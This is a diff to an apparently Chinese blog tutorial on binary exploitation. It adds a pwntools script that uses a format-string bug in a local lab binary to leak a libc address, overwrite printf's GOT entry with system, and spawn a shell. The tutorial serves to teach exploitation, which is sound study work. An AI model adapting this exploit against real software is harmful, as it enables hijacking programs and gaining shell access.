@@ -17,6 +17,37 @@ tags:
 
 我们看一个程序
 
+```python
+
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+elf=ELF("./smallbug2")
+p=process("./smallbug2")
+
+p.recv()
+p.sendline("%3$p")
+
+libc_addr=int(p.recv(),16)-0xef360
+printf_got=elf.got["printf"]
+system_addr=libc_addr+0x46590
+
+print "system_addr = "+hex(system_addr)
+
+payload="a%"+str(system_addr-1)+"c%9$lln"+p64(printf_got)
+
+p.sendline(payload)
+p.recv()
+
+
+p.sendline("/bin/sh\x00")
+p.interactive()
+
+```
+
+
+
+
 ` ``c
 #include <stdio.h>
 #include <stdlib.h>
@@ -110,6 +141,7 @@ printf("goodbye world!\n");
 
 
 ```c
+
 	#include <stdio.h>
 	#include <stdlib.h>
 		
